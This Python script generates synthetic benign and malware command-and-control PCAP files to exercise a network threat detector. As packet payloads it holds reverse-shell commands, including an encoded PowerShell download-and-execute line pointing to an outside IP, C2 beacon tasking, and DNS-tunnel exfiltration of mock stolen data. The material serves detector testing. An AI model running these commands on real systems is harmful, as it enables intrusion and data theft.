"""
generate_pcap.py - Generate benign + C&C sample PCAP files.

C&C PCAP is designed to trigger CRITICAL/HIGH alerts in the detector:
  - Uses IPs from KNOWN_C2_IPS (TrickBot, QakBot, Cobalt Strike, Emotet)
  - Uses domains from KNOWN_C2_DOMAINS (svchost32update.net, xjfhskjfhskjfhs.ru)
  - Beaconing flows with very regular IAT (low CV -> high regularity_score)
  - Reverse shell on port 4444 (flagged as suspicious)
  - DNS tunneling with high-entropy DGA-like subdomains

Requires: scapy >= 2.5.0
Run:      python generate_pcap.py
Output:   dataset/sample_pcap/benign_traffic.pcap
          dataset/sample_pcap/cnc_traffic.pcap
"""

import os
import random
import warnings

warnings.filterwarnings("ignore")
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, DNSRR, Raw, wrpcap

# ─────────────────────────────────────────────────────────────
# Static MACs — avoid ARP lookups on Windows
# ─────────────────────────────────────────────────────────────
C_MAC = "aa:bb:cc:11:22:33"   # client / bot
S_MAC = "aa:bb:cc:44:55:66"   # server / C&C


def _ec():
    """Ether: client -> server."""
    return Ether(src=C_MAC, dst=S_MAC)


def _es():
    """Ether: server -> client."""
    return Ether(src=S_MAC, dst=C_MAC)


def rand_priv():
    return f"192.168.{random.randint(1,254)}.{random.randint(2,253)}"


def rand_pub():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def eport():
    return random.randint(49152, 65535)


# ─────────────────────────────────────────────────────────────
# TCP helpers
# ─────────────────────────────────────────────────────────────
def tcp_syn(src_ip, dst_ip, sport, dport, t):
    """Full TCP 3-way handshake. Returns (pkts, seq_c, seq_s)."""
    seq_c = random.randint(10000, 9000000)
    seq_s = random.randint(10000, 9000000)
    pkts = [
        _ec() / IP(src=src_ip, dst=dst_ip, ttl=64) /
        TCP(sport=sport, dport=dport, flags="S", seq=seq_c, window=65535),

        _es() / IP(src=dst_ip, dst=src_ip, ttl=128) /
        TCP(sport=dport, dport=sport, flags="SA", seq=seq_s, ack=seq_c + 1, window=8192),

        _ec() / IP(src=src_ip, dst=dst_ip, ttl=64) /
        TCP(sport=sport, dport=dport, flags="A", seq=seq_c + 1, ack=seq_s + 1, window=65535),
    ]
    for i, p in enumerate(pkts):
        p.time = t + i * 0.001
    return pkts, seq_c + 1, seq_s + 1


def tcp_fin(src_ip, dst_ip, sport, dport, seq_c, seq_s, t):
    pkts = [
        _ec() / IP(src=src_ip, dst=dst_ip, ttl=64) /
        TCP(sport=sport, dport=dport, flags="FA", seq=seq_c, ack=seq_s, window=65535),

        _es() / IP(src=dst_ip, dst=src_ip, ttl=128) /
        TCP(sport=dport, dport=sport, flags="FA", seq=seq_s, ack=seq_c + 1, window=8192),

        _ec() / IP(src=src_ip, dst=dst_ip, ttl=64) /
        TCP(sport=sport, dport=dport, flags="A", seq=seq_c + 1, ack=seq_s + 1, window=65535),
    ]
    for i, p in enumerate(pkts):
        p.time = t + i * 0.001
    return pkts


# ═══════════════════════════════════════════════════════════════
#  BENIGN TRAFFIC
# ═══════════════════════════════════════════════════════════════

def benign_dns(client, dns_srv, domain, txid, t):
    sport = eport()
    q = _ec() / IP(src=client, dst=dns_srv, ttl=64) / \
        UDP(sport=sport, dport=53) / \
        DNS(id=txid, rd=1, qd=DNSQR(qname=domain))
    r = _es() / IP(src=dns_srv, dst=client, ttl=128) / \
        UDP(sport=53, dport=sport) / \
        DNS(id=txid, qr=1, aa=1, rd=1, ra=1,
            qd=DNSQR(qname=domain),
            an=DNSRR(rrname=domain, ttl=300, rdata=rand_pub()))
    q.time = t
    r.time = t + 0.015
    return [q, r]


def benign_http(client, server, host, path, sport, t):
    pkts, sc, ss = tcp_syn(client, server, sport, 80, t)
    req_body = (
        f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120\r\n"
        f"Accept: text/html,*/*;q=0.8\r\nConnection: keep-alive\r\n\r\n"
    ).encode()
    req = _ec() / IP(src=client, dst=server, ttl=64) / \
          TCP(sport=sport, dport=80, flags="PA", seq=sc, ack=ss, window=65535) / \
          Raw(load=req_body)
    req.time = t + 0.005
    html = b"<html><body><h1>Normal Page</h1></body></html>"
    resp_raw = (b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
                b"Content-Length: " + str(len(html)).encode() + b"\r\n"
                b"Server: nginx/1.24.0\r\n\r\n" + html)
    resp = _es() / IP(src=server, dst=client, ttl=128) / \
           TCP(sport=80, dport=sport, flags="PA", seq=ss, ack=sc + len(req_body), window=8192) / \
           Raw(load=resp_raw)
    resp.time = t + 0.055
    pkts += [req, resp]
    pkts += tcp_fin(client, server, sport, 80,
                    sc + len(req_body), ss + len(resp_raw), t + 0.065)
    return pkts


def benign_tls(client, server, sport, t):
    pkts, sc, ss = tcp_syn(client, server, sport, 443, t)
    client_hello = bytes([0x16, 0x03, 0x01, 0x00, 0xf4, 0x01, 0x00, 0x00, 0xf0,
                          0x03, 0x03]) + bytes(random.getrandbits(8) for _ in range(32)) + bytes([
        0x20]) + bytes(random.getrandbits(8) for _ in range(32)) + bytes([
        0x00, 0x2a, 0x13, 0x01, 0x13, 0x02, 0x13, 0x03,
        0xc0, 0x2b, 0xc0, 0x2f, 0xcc, 0xa9, 0xcc, 0xa8,
        0xc0, 0x13, 0xc0, 0x14, 0x00, 0x9c, 0x00, 0x9d,
        0x00, 0x2f, 0x00, 0x35, 0x00, 0x0a, 0x00, 0xff,
        0x01, 0x00,
    ])
    ch = _ec() / IP(src=client, dst=server, ttl=64) / \
         TCP(sport=sport, dport=443, flags="PA", seq=sc, ack=ss, window=65535) / \
         Raw(load=client_hello)
    ch.time = t + 0.005
    srv_hello = bytes([0x16, 0x03, 0x03, 0x00, 0x7a]) + bytes(random.getrandbits(8) for _ in range(122))
    sh = _es() / IP(src=server, dst=client, ttl=128) / \
         TCP(sport=443, dport=sport, flags="PA", seq=ss, ack=sc + len(client_hello), window=8192) / \
         Raw(load=srv_hello)
    sh.time = t + 0.028
    pkts += [ch, sh]
    cur_sc = sc + len(client_hello)
    for i in range(3):
        seg_len = random.randint(400, 1200)
        app = _ec() / IP(src=client, dst=server, ttl=64) / \
              TCP(sport=sport, dport=443, flags="PA",
                  seq=cur_sc + i * seg_len, ack=ss + len(srv_hello), window=65535) / \
              Raw(load=bytes([0x17, 0x03, 0x03]) + bytes(random.getrandbits(8) for _ in range(seg_len - 3)))
        app.time = t + 0.04 + i * 0.012
        pkts.append(app)
    return pkts


def build_benign_pcap(out_path, n_flows=35):
    print("[*] Building benign_traffic.pcap ...")
    all_pkts = []
    t = 1700000000.0
    dns_srv = "8.8.8.8"
    domains = [
        "www.google.com", "www.youtube.com", "www.facebook.com",
        "github.com", "stackoverflow.com", "mail.google.com",
        "cdn.jsdelivr.net", "fonts.googleapis.com", "api.twitter.com",
    ]
    http_targets = [
        ("news.example.vn", "/tin-tuc/hom-nay", rand_pub()),
        ("shop.example.com", "/product/laptop-123", rand_pub()),
        ("api.example.com", "/v1/health", rand_pub()),
    ]
    clients = [rand_priv() for _ in range(5)]

    for i in range(n_flows):
        client = random.choice(clients)
        t += random.uniform(0.1, 1.5)
        ftype = random.choices(["dns", "http", "https"], weights=[25, 35, 40])[0]
        if ftype == "dns":
            all_pkts += benign_dns(client, dns_srv, random.choice(domains), i + 1, t)
        elif ftype == "http":
            host, path, srv = random.choice(http_targets)
            all_pkts += benign_http(client, srv, host, path, eport(), t)
        else:
            all_pkts += benign_tls(client, rand_pub(), eport(), t)

    all_pkts.sort(key=lambda p: float(p.time))
    wrpcap(out_path, all_pkts)
    print(f"    [OK] Saved: {out_path}  ({len(all_pkts)} packets)")
    return len(all_pkts)


# ═══════════════════════════════════════════════════════════════
#  C&C TRAFFIC — Designed to trigger CRITICAL/HIGH alerts
# ═══════════════════════════════════════════════════════════════

# ── Known C&C IPs from KNOWN_C2_IPS in threat_intel.py ──────
#   "45.142.212.100" → Emotet      confidence=95
#   "185.220.101.34" → TrickBot    confidence=88
#   "91.219.236.166" → QakBot      confidence=92
#   "162.33.177.18"  → LockBit     confidence=93
#   "103.43.75.120"  → BlackMatter confidence=91
#   "194.165.16.10"  → CobaltStr   confidence=90
# ── Known C&C Domains from KNOWN_C2_DOMAINS ─────────────────
#   "svchost32update.net" → CobaltStrike confidence=85
#   "xjfhskjfhskjfhs.ru"  → DGA Malware confidence=92
#   "aabbccddeeff1234.com" → DGA-ZeuS   confidence=89
#   "malware-c2.tk"        → DarkComet  confidence=95
#   "bot-controller.xyz"   → Mirai      confidence=88


def gen_emotet_beacon(bot, cnc_ip, t, interval_ms=60000, count=6):
    """
    Emotet HTTP beacon — CRITICAL trigger:
    - C&C IP: 45.142.212.100 (confidence=95 in threat_intel)
    - Beaconing: very regular interval (~60s ±2s) → low CV → high regularity_score
    - Flow features: small payload, low active_mean, high idle_mean
    - Domain lookup: svchost32update.net (CobaltStrike in KNOWN_C2_DOMAINS)
    """
    pkts = []
    # DNS lookup for known malicious domain FIRST
    sport_dns = eport()
    dns_q = _ec() / IP(src=bot, dst="45.142.212.100", ttl=128) / \
            UDP(sport=sport_dns, dport=53) / \
            DNS(id=0x1337, rd=1, qd=DNSQR(qname="svchost32update.net"))
    dns_q.time = t
    dns_r = _es() / IP(src="45.142.212.100", dst=bot, ttl=64) / \
            UDP(sport=53, dport=sport_dns) / \
            DNS(id=0x1337, qr=1, aa=1,
                qd=DNSQR(qname="svchost32update.net"),
                an=DNSRR(rrname="svchost32update.net", ttl=60, rdata="45.142.212.100"))
    dns_r.time = t + 0.012
    pkts += [dns_q, dns_r]

    # Beacon loop — very regular intervals (simulate beaconing pattern)
    cur = t + 0.1
    sport = eport()
    for i in range(count):
        hs, sc, ss = tcp_syn(bot, cnc_ip, sport, 80, cur)
        pkts += hs

        bot_id = "".join(random.choices("0123456789abcdef", k=16))
        # Small form payload — mimics Emotet checkin
        form = f"id={bot_id}&os=win10&av=0&priv=1&ver=4.1".encode()
        req_raw = (
            f"POST /wm/api/ HTTP/1.1\r\n"
            f"Host: svchost32update.net\r\n"
            f"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(form)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode() + form
        req = _ec() / IP(src=bot, dst=cnc_ip, ttl=128) / \
              TCP(sport=sport, dport=80, flags="PA", seq=sc, ack=ss, window=8192) / \
              Raw(load=req_raw)
        req.time = cur + 0.003

        cmd_b64 = "Y21kIC9jIHdob2FtaSAmJiBuZXQgdXNlcg=="
        resp_json = f'{{"s":"ok","c":"{cmd_b64}","t":{interval_ms}}}'.encode()
        resp_raw = (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: application/json\r\n"
            b"Content-Length: " + str(len(resp_json)).encode() + b"\r\n"
            b"Server: Apache\r\n\r\n" + resp_json
        )
        resp = _es() / IP(src=cnc_ip, dst=bot, ttl=64) / \
               TCP(sport=80, dport=sport, flags="PA",
                   seq=ss, ack=sc + len(req_raw), window=65535) / \
               Raw(load=resp_raw)
        resp.time = cur + 0.038

        pkts += [req, resp]
        pkts += tcp_fin(bot, cnc_ip, sport, 80,
                        sc + len(req_raw), ss + len(resp_raw), cur + 0.05)
        # Very regular interval: exactly 60s ± 1.5s (low CV → high regularity_score)
        cur += (interval_ms / 1000.0) + random.uniform(-1.5, 1.5)
        sport = eport()

    return pkts


def gen_trickbot_beacon(bot, cnc_ip, t, interval_ms=120000, count=4):
    """
    TrickBot HTTPS beacon — CRITICAL trigger:
    - C&C IP: 185.220.101.34 (confidence=88 in threat_intel)
    - Regular beacon every ~120s
    - Domain: xjfhskjfhskjfhs.ru (DGA Malware in KNOWN_C2_DOMAINS, confidence=92)
    """
    pkts = []
    # DNS lookup for known DGA domain
    sport_dns = eport()
    dns_q = _ec() / IP(src=bot, dst="8.8.8.8", ttl=64) / \
            UDP(sport=sport_dns, dport=53) / \
            DNS(id=0x4321, rd=1, qd=DNSQR(qname="xjfhskjfhskjfhs.ru"))
    dns_q.time = t
    dns_r = _es() / IP(src="8.8.8.8", dst=bot, ttl=128) / \
            UDP(sport=53, dport=sport_dns) / \
            DNS(id=0x4321, qr=1, aa=1,
                qd=DNSQR(qname="xjfhskjfhskjfhs.ru"),
                an=DNSRR(rrname="xjfhskjfhskjfhs.ru", ttl=30, rdata=cnc_ip))
    dns_r.time = t + 0.010
    pkts += [dns_q, dns_r]

    cur = t + 0.1
    sport = eport()
    for i in range(count):
        hs, sc, ss = tcp_syn(bot, cnc_ip, sport, 443, cur)
        pkts += hs

        # TLS ClientHello with TrickBot cipher suites
        tls_ch = bytes([0x16, 0x03, 0x01, 0x00, 0xea, 0x01, 0x00, 0x00, 0xe6,
                        0x03, 0x03]) + bytes(random.getrandbits(8) for _ in range(32)) + bytes([
            0x00, 0x00, 0x1c,
            0xc0, 0x2b, 0xc0, 0x2c, 0xc0, 0x2f, 0xc0, 0x30,
            0x00, 0x9c, 0x00, 0x9d, 0xc0, 0x13, 0xc0, 0x14,
            0x00, 0x2f, 0x00, 0x35, 0x00, 0x0a, 0x00, 0x9e,
            0x00, 0x9f, 0x00, 0xff,
            0x01, 0x00,
        ])
        ch_pkt = _ec() / IP(src=bot, dst=cnc_ip, ttl=128) / \
                 TCP(sport=sport, dport=443, flags="PA", seq=sc, ack=ss, window=8192) / \
                 Raw(load=tls_ch)
        ch_pkt.time = cur + 0.004

        srv_hello = bytes([0x16, 0x03, 0x03, 0x00, 0x51]) + bytes(random.getrandbits(8) for _ in range(81))
        sh_pkt = _es() / IP(src=cnc_ip, dst=bot, ttl=64) / \
                 TCP(sport=443, dport=sport, flags="PA",
                     seq=ss, ack=sc + len(tls_ch), window=65535) / \
                 Raw(load=srv_hello)
        sh_pkt.time = cur + 0.030

        # Encrypted beacon payload (small, periodic)
        enc_data = bytes([0x17, 0x03, 0x03, 0x00, 0x50]) + bytes(random.getrandbits(8) for _ in range(80))
        data_pkt = _ec() / IP(src=bot, dst=cnc_ip, ttl=128) / \
                   TCP(sport=sport, dport=443, flags="PA",
                       seq=sc + len(tls_ch), ack=ss + len(srv_hello), window=8192) / \
                   Raw(load=enc_data)
        data_pkt.time = cur + 0.055

        pkts += [ch_pkt, sh_pkt, data_pkt]
        pkts += tcp_fin(bot, cnc_ip, sport, 443,
                        sc + len(tls_ch) + len(enc_data),
                        ss + len(srv_hello),
                        cur + 0.065)
        cur += (interval_ms / 1000.0) + random.uniform(-2, 2)
        sport = eport()

    return pkts


def gen_cobalt_strike_beacon(bot, cnc_ip, t, interval_ms=60000, count=5):
    """
    Cobalt Strike malleable C2 beacon — CRITICAL trigger:
    - C&C IP: 194.165.16.10 (confidence=90 in threat_intel)
    - Regular beacon with jitter ±5%
    - Domain: aabbccddeeff1234.com (DGA-ZeuS in KNOWN_C2_DOMAINS)
    - Distinctive: GET /jquery-3.3.1.min.js disguise
    """
    pkts = []
    sport_dns = eport()
    dns_q = _ec() / IP(src=bot, dst="8.8.8.8", ttl=64) / \
            UDP(sport=sport_dns, dport=53) / \
            DNS(id=0xBEEF, rd=1, qd=DNSQR(qname="aabbccddeeff1234.com"))
    dns_q.time = t
    dns_r = _es() / IP(src="8.8.8.8", dst=bot, ttl=128) / \
            UDP(sport=53, dport=sport_dns) / \
            DNS(id=0xBEEF, qr=1, aa=1,
                qd=DNSQR(qname="aabbccddeeff1234.com"),
                an=DNSRR(rrname="aabbccddeeff1234.com", ttl=5, rdata=cnc_ip))
    dns_r.time = t + 0.008
    pkts += [dns_q, dns_r]

    cur = t + 0.05
    sport = eport()
    for i in range(count):
        hs, sc, ss = tcp_syn(bot, cnc_ip, sport, 80, cur)
        pkts += hs

        # Cobalt Strike malleable C2 disguised as jQuery CDN request
        cs_id = "".join(random.choices("0123456789abcdef", k=26))
        req_raw = (
            f"GET /jquery-3.3.1.min.js HTTP/1.1\r\n"
            f"Host: aabbccddeeff1234.com\r\n"
            f"Accept: */*\r\n"
            f"Cookie: __utmz={cs_id}\r\n"
            f"User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\r\n"
            f"Connection: Keep-Alive\r\n\r\n"
        ).encode()
        req = _ec() / IP(src=bot, dst=cnc_ip, ttl=128) / \
              TCP(sport=sport, dport=80, flags="PA", seq=sc, ack=ss, window=8192) / \
              Raw(load=req_raw)
        req.time = cur + 0.003

        # C&C response: fake JS + embedded shellcode
        fake_js_header = b"!function(e,t){\"use strict\";"
        shellcode = bytes(random.getrandbits(8) for _ in range(512))
        body = fake_js_header + shellcode
        resp_raw = (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: application/javascript; charset=utf-8\r\n"
            b"Content-Length: " + str(len(body)).encode() + b"\r\n"
            b"Cache-Control: max-age=0\r\n"
            b"Server: cloudflare\r\n\r\n" + body
        )
        resp = _es() / IP(src=cnc_ip, dst=bot, ttl=64) / \
               TCP(sport=80, dport=sport, flags="PA",
                   seq=ss, ack=sc + len(req_raw), window=65535) / \
               Raw(load=resp_raw)
        resp.time = cur + 0.045

        pkts += [req, resp]
        pkts += tcp_fin(bot, cnc_ip, sport, 80,
                        sc + len(req_raw), ss + len(resp_raw), cur + 0.055)
        # Jitter ±5% as typical Cobalt Strike
        jitter = interval_ms * 0.05
        cur += (interval_ms / 1000.0) + random.uniform(-jitter / 1000, jitter / 1000)
        sport = eport()

    return pkts


def gen_port_scan(scanner, target, t):
    """SYN scan — reconnaissance phase."""
    pkts = []
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
             443, 445, 1433, 3306, 3389, 4444, 5900, 8080]
    open_ports = {80, 443, 3389, 4444}
    cur = t
    for port in ports:
        sport = eport()
        seq_c = random.randint(1000, 9999999)
        syn = _ec() / IP(src=scanner, dst=target, ttl=64) / \
              TCP(sport=sport, dport=port, flags="S", seq=seq_c, window=1024)
        syn.time = cur
        pkts.append(syn)
        if port in open_ports:
            sa = _es() / IP(src=target, dst=scanner, ttl=128) / \
                 TCP(sport=port, dport=sport, flags="SA",
                     seq=random.randint(1000, 9999999), ack=seq_c + 1, window=8192)
            sa.time = cur + 0.002
            rst = _ec() / IP(src=scanner, dst=target, ttl=64) / \
                  TCP(sport=sport, dport=port, flags="R", seq=seq_c + 1, window=0)
            rst.time = cur + 0.003
            pkts += [sa, rst]
        else:
            rsta = _es() / IP(src=target, dst=scanner, ttl=128) / \
                   TCP(sport=port, dport=sport, flags="RA", seq=0, ack=seq_c + 1, window=0)
            rsta.time = cur + 0.002
            pkts.append(rsta)
        cur += random.uniform(0.002, 0.008)
    return pkts


def gen_reverse_shell(bot, cnc_ip, t):
    """
    Reverse TCP shell on port 4444 — flagged by PORT_HEURISTICS.
    C&C IP: 91.219.236.166 (QakBot, confidence=92)
    """
    sport = eport()
    pkts, sc, ss = tcp_syn(bot, cnc_ip, sport, 4444, t)

    banner = (b"Microsoft Windows [Version 10.0.19045.3324]\r\n"
              b"(c) Microsoft Corporation. All rights reserved.\r\n\r\n"
              b"C:\\Windows\\system32>")
    b1 = _es() / IP(src=cnc_ip, dst=bot, ttl=64) / \
         TCP(sport=4444, dport=sport, flags="PA", seq=ss, ack=sc + 1, window=65535) / \
         Raw(load=banner)
    b1.time = t + 0.018
    pkts.append(b1)

    commands = [
        b"whoami\r\n",
        b"hostname\r\n",
        b"ipconfig /all\r\n",
        b"net user\r\n",
        b"net localgroup administrators\r\n",
        b"tasklist /svc\r\n",
        b"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\r\n",
        b"powershell -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=\r\n",
    ]
    responses = [
        b"desktop-ab1234\\administrator\r\n\r\nC:\\Windows\\system32>",
        b"DESKTOP-AB1234\r\n\r\nC:\\Windows\\system32>",
        b"\r\nWindows IP Configuration\r\n   IPv4: 192.168.1.105\r\n\r\nC:\\Windows\\system32>",
        b"\r\nAdministrator    user    Guest\r\n\r\nC:\\Windows\\system32>",
        b"\r\nAdministrator\r\nuser\r\n\r\nC:\\Windows\\system32>",
        b"\r\nsvchost.exe 812\r\npowershell.exe 3344\r\n\r\nC:\\Windows\\system32>",
        b"\r\nSecurityHealth  REG_SZ  %windir%\\...\r\n\r\nC:\\Windows\\system32>",
        b"\r\nPayload downloaded and executed.\r\n\r\nC:\\Windows\\system32>",
    ]

    cur_sc = sc + 1
    cur_ss = ss + len(banner)
    cur_t = t + 0.025

    for cmd, resp in zip(commands, responses):
        cmd_pkt = _es() / IP(src=cnc_ip, dst=bot, ttl=64) / \
                  TCP(sport=4444, dport=sport, flags="PA",
                      seq=cur_ss, ack=cur_sc, window=65535) / \
                  Raw(load=cmd)
        cmd_pkt.time = cur_t
        cur_t += random.uniform(1.5, 5.0)

        resp_pkt = _ec() / IP(src=bot, dst=cnc_ip, ttl=128) / \
                   TCP(sport=sport, dport=4444, flags="PA",
                       seq=cur_sc, ack=cur_ss + len(cmd), window=8192) / \
                   Raw(load=resp)
        resp_pkt.time = cur_t
        cur_t += random.uniform(0.5, 2.0)

        pkts += [cmd_pkt, resp_pkt]
        cur_ss += len(cmd)
        cur_sc += len(resp)

    return pkts


def gen_lockbit_exfil(bot, cnc_ip, t):
    """
    LockBit ransomware data exfiltration.
    - C&C IP: 162.33.177.18 (LockBit, confidence=93)
    - Large encrypted data transfer on port 443
    """
    sport = eport()
    pkts, sc, ss = tcp_syn(bot, cnc_ip, sport, 443, t)

    # DNS: aabbccddeeff1234.com lookup before exfil
    sport_dns = eport()
    dns_q = _ec() / IP(src=bot, dst="8.8.8.8", ttl=64) / \
            UDP(sport=sport_dns, dport=53) / \
            DNS(id=0xDEAD, rd=1, qd=DNSQR(qname="malware-c2.tk"))
    dns_q.time = t - 0.5
    dns_r = _es() / IP(src="8.8.8.8", dst=bot, ttl=128) / \
            UDP(sport=53, dport=sport_dns) / \
            DNS(id=0xDEAD, qr=1, aa=1,
                qd=DNSQR(qname="malware-c2.tk"),
                an=DNSRR(rrname="malware-c2.tk", ttl=5, rdata=cnc_ip))
    dns_r.time = t - 0.490
    pkts += [dns_q, dns_r]

    # Large encrypted segments — exfil stolen data
    cur_sc = sc
    cur_t = t + 0.01

    for seg_i in range(20):
        seg_size = random.randint(1380, 1460)
        payload = bytes([0x17, 0x03, 0x03]) + bytes(random.getrandbits(8) for _ in range(seg_size - 3))
        pkt = _ec() / IP(src=bot, dst=cnc_ip, ttl=64) / \
              TCP(sport=sport, dport=443, flags="PA",
                  seq=cur_sc, ack=ss + 1, window=65535) / \
              Raw(load=payload)
        pkt.time = cur_t
        pkts.append(pkt)

        ack_pkt = _es() / IP(src=cnc_ip, dst=bot, ttl=64) / \
                  TCP(sport=443, dport=sport, flags="A",
                      seq=ss + 1, ack=cur_sc + seg_size, window=65535)
        ack_pkt.time = cur_t + 0.004
        pkts.append(ack_pkt)

        cur_sc += seg_size
        cur_t += random.uniform(0.008, 0.025)

    return pkts


def gen_dns_tunnel_exfil(bot, dns_cnc, t):
    """
    DNS tunneling using bot-controller.xyz (Mirai in KNOWN_C2_DOMAINS).
    Very high query frequency + long hex-encoded subdomains.
    """
    pkts = []
    # Exfiltrate data as hex chunks in TXT record queries
    stolen_data_chunks = [
        "4445534b544f502d414231323334",   # DESKTOP-AB1234
        "61646d696e6973747261746f72",      # administrator
        "433a5c55736572735c61646d696e",    # C:\Users\admin
        "5c446f63756d656e74735c73656372",  # \Documents\secr
        "6574732d323032342e7a69702e656e63", # ets-2024.zip.enc
        "78636f72706f726174652d73657272",  # xcorporate-serr
        "766572732d62616b75702e74617223",  # vers-backup.tar#
    ]
    cur = t
    for idx, chunk in enumerate(stolen_data_chunks):
        # Long subdomain with hex data → triggers DGA heuristic (entropy, digit_ratio, length)
        subdomain = f"{chunk}.{idx:02d}.c2.bot-controller.xyz"
        txid = random.randint(1000, 65535)
        sport = eport()

        q = _ec() / IP(src=bot, dst=dns_cnc, ttl=128) / \
            UDP(sport=sport, dport=53) / \
            DNS(id=txid, rd=1, qd=DNSQR(qname=subdomain, qtype="TXT"))
        q.time = cur

        r = _es() / IP(src=dns_cnc, dst=bot, ttl=64) / \
            UDP(sport=53, dport=sport) / \
            DNS(id=txid, qr=1, aa=1,
                qd=DNSQR(qname=subdomain, qtype="TXT"),
                an=DNSRR(rrname=subdomain, type="TXT", ttl=0, rdata="4f4b"))
        r.time = cur + 0.011
        pkts += [q, r]
        cur += random.uniform(0.03, 0.15)   # Very high freq → anomalous

    return pkts


def gen_blackmatter_lateral(bot, cnc_ip, t):
    """
    BlackMatter ransomware lateral movement + SMB exploitation simulation.
    - C&C: 103.43.75.120 (BlackMatter, confidence=91)
    - Targets: SMB port 445, RDP port 3389
    """
    pkts = []
    targets = ["192.168.1.101", "192.168.1.102", "192.168.1.103"]
    cur = t

    for target in targets:
        # SMB connection attempt (port 445)
        sport = eport()
        hs, sc, ss = tcp_syn(bot, target, sport, 445, cur)
        pkts += hs

        # SMB negotiation
        smb_neg = (b"\x00\x00\x00\x85"          # NetBIOS length
                   b"\xff\x53\x4d\x42"            # SMB signature
                   b"\x72\x00\x00\x00\x00"        # SMB Negotiate
                   b"\x18\x53\xc8\x00\x00\x00\x00\x00"
                   b"\x00\x00\x00\x00\x00\x00\x00\x00"
                   b"\x00\x00\xff\xfe\x00\x00\x40\x00")
        smb_pkt = _ec() / IP(src=bot, dst=target, ttl=128) / \
                  TCP(sport=sport, dport=445, flags="PA", seq=sc, ack=ss, window=8192) / \
                  Raw(load=smb_neg + bytes(random.getrandbits(8) for _ in range(100)))
        smb_pkt.time = cur + 0.004

        smb_resp = _es() / IP(src=target, dst=bot, ttl=128) / \
                   TCP(sport=445, dport=sport, flags="PA",
                       seq=ss, ack=sc + len(smb_neg) + 100, window=65535) / \
                   Raw(load=bytes([0xff, 0x53, 0x4d, 0x42]) + bytes(random.getrandbits(8) for _ in range(80)))
        smb_resp.time = cur + 0.020
        pkts += [smb_pkt, smb_resp]
        cur += random.uniform(0.5, 2.0)

    # Report back to C&C
    sport2 = eport()
    hs2, sc2, ss2 = tcp_syn(bot, cnc_ip, sport2, 8080, cur)
    pkts += hs2
    report = f"lateral=3&infected=192.168.1.101,102,103&status=ok&key=BLACKMATTER".encode()
    rpt_pkt = _ec() / IP(src=bot, dst=cnc_ip, ttl=128) / \
              TCP(sport=sport2, dport=8080, flags="PA", seq=sc2, ack=ss2, window=8192) / \
              Raw(load=b"POST /report HTTP/1.1\r\nHost: " + cnc_ip.encode() +
                  b"\r\nContent-Length: " + str(len(report)).encode() + b"\r\n\r\n" + report)
    rpt_pkt.time = cur + 0.005
    pkts.append(rpt_pkt)

    return pkts


def build_cnc_pcap(out_path):
    """
    Build C&C PCAP with CRITICAL/HIGH threat indicators.
    Uses IPs and domains from threat_intel.py KNOWN_C2_IPS / KNOWN_C2_DOMAINS.
    """
    print("[*] Building cnc_traffic.pcap (with CRITICAL/HIGH threats) ...")
    all_pkts = []
    t = 1700000000.0

    bot     = "192.168.1.105"    # Infected host
    atk     = "192.168.1.200"    # Attacker in LAN

    # Known malicious IPs (from threat_intel.py KNOWN_C2_IPS)
    emotet_cnc      = "45.142.212.100"   # Emotet    confidence=95
    trickbot_cnc    = "185.220.101.34"   # TrickBot  confidence=88
    cobalt_cnc      = "194.165.16.10"    # CobaltStr confidence=90
    qakbot_cnc      = "91.219.236.166"   # QakBot    confidence=92
    lockbit_cnc     = "162.33.177.18"    # LockBit   confidence=93
    blackmatter_cnc = "103.43.75.120"    # BlackMat  confidence=91
    dns_cnc         = "45.142.212.100"   # Attacker-controlled DNS (same as Emotet)

    # ── Stage 1: Reconnaissance (SYN scan) ─────────────────
    print("    [1/6] SYN port scan ...")
    t += 2
    all_pkts += gen_port_scan(atk, bot, t)

    # ── Stage 2: Emotet HTTP beacon (KNOWN IP + KNOWN DOMAIN) ──
    print("    [2/6] Emotet HTTP beacon (IP:45.142.212.100 / domain:svchost32update.net) ...")
    t += 15
    all_pkts += gen_emotet_beacon(bot, emotet_cnc, t, interval_ms=60000, count=5)

    # ── Stage 3: TrickBot HTTPS beacon (KNOWN IP + DGA DOMAIN) ──
    print("    [3/6] TrickBot HTTPS beacon (IP:185.220.101.34 / domain:xjfhskjfhskjfhs.ru) ...")
    t += 380
    all_pkts += gen_trickbot_beacon(bot, trickbot_cnc, t, interval_ms=120000, count=3)

    # ── Stage 4: Cobalt Strike malleable C2 (KNOWN IP + DGA DOMAIN) ──
    print("    [4/6] Cobalt Strike beacon (IP:194.165.16.10 / domain:aabbccddeeff1234.com) ...")
    t += 450
    all_pkts += gen_cobalt_strike_beacon(bot, cobalt_cnc, t, interval_ms=60000, count=4)

    # ── Stage 5: QakBot reverse shell (port 4444) ───────────
    print("    [5/6] QakBot reverse shell port 4444 (IP:91.219.236.166) ...")
    t += 310
    all_pkts += gen_reverse_shell(bot, qakbot_cnc, t)

    # ── Stage 6: LockBit data exfil + DNS tunnel ────────────
    print("    [6/6] LockBit exfil + DNS tunnel (malware-c2.tk / bot-controller.xyz) ...")
    t += 200
    all_pkts += gen_lockbit_exfil(bot, lockbit_cnc, t)
    t += 50
    all_pkts += gen_dns_tunnel_exfil(bot, dns_cnc, t)
